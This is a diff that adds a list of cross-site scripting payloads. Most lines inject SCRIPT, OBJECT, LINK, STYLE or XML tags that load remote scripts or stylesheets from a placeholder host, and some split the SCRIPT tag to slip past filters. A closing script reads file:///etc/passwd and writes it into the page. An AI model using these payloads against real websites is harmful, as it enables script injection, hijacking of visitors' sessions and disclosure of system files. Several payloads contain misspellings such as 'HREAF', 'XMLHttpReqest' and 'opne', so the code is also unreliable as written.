@@ -1,0 +1,22 @@
+<OBJECT TYPE="text/x-scriptlet" DATA="http://<REPLCE_ME>/scriptlet.html"></OBJECT>
+<A HREAF="<REPLCE_ME>">XSS</A>
+<IMG SRC="http://<REPLCE_ME>"></IMG>
+<LAYER SRC="http://<REPLCE_ME>/scriptlet.html"></LAYER>
+<LINK REL="stylesheet" HREAF="http://<REPLCE_ME>">/XSS.css">
+<META HTTP-EQUIV="Link" content="http://<REPLCE_ME>/xss.css; REL=stylesheet">
+<SCRIPT SRC="http://<REPLCE_ME>/xss.jpg"></SCRIPT>
+<SCRIPT SRC= http://<REPLCE_ME>/js.js></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://<REPLCE_ME>/js.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://<REPLCE_ME>/xss.js"></SCRIPT>
+<STYLE>@import 'http://<REPLCE_ME>/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url(http://<REPLCE_ME>/xssmoz.xml#xss")}<STYLE>
+<XML SRC="http://<REPLCE_ME>/xsstest.xml" ID=I></xml>
+
+<script>
+x =new XMLHttpReqest;
+x.onload = function(){
+	document.write(this.response.Text);
+};
+x.opne('GET', 'file:///etc/passwd');
+x.send();
+</script>
